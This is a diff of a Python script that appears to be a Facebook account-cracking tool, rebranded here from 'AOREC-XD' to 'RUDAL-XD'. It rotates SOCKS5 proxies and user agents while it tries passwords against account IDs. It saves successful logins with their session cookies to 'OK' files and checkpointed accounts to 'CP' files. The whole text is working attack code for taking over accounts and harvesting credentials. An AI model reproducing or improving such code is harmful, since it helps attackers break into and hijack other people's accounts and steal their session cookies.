@@ -1219,8 +1219,8 @@ def touch(idf,pwv):
 	fff = '%'
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
-	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
+	ua = random.choice(free)
+	ua2 = random.choice(free)
 	ses = requests.Session()
 	prog.update(des,description=f'\r[bold white]TOUCH [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
 	prog.advance(des)
@@ -1241,8 +1241,8 @@ def touch(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					cetak(nel(statuscp1, title='RUDAL-XD CP'))
+					open('/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -1252,17 +1252,17 @@ def touch(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='RUDAL-XD OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1285,7 +1285,7 @@ def touch(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]RUDAL-XD OK[/bold green]'))
 					ok+=1
 					break
 
